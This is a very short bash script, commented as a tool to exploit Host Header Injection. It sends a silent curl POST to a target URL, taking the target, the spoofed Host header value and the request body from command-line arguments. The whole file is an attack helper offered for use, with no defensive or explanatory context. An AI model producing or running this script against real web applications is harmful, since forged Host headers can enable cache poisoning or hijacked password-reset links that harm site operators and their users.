#!/bin/bash
# Script to exploit Host Header Injection
curl -s -H "Host: $1" -d "$3" "$2"
